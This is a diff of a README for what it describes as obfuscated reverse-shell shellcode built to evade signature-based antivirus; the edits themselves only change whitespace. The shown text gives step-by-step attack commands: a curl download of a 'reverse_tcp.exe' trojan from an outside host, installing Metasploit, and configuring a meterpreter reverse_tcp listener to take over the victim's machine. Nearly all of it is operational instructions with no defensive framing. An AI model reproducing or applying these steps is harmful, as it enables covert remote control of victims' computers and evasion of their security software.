@@ -14,29 +14,32 @@ Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
       
      To download the trojan as a victim:
             $curl -O http://bigbadcyborg.com/reverse_tcp.exe
+            
 
       Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
-      
       To download the metasploit installer:
+      
       $curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
-
       $chmod 755 msfinstall
-
       $./msfinstall
-
       $sudo msfconsole
+      
 
       To run listener on attackers machine:
+      
       $msfconsole
       $use exploit/multi/handler
       $set PAYLOAD windows/x64/meterpreter/reverse_tcp
       $set LHOST your_ip
       $set LPORT 4444
       $exploit
+      
 
       Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
       attacker enters the following command to enter the shell of the victim:
+      
       $shell
+
 
 
       For a video explanation watch the following youtube video:
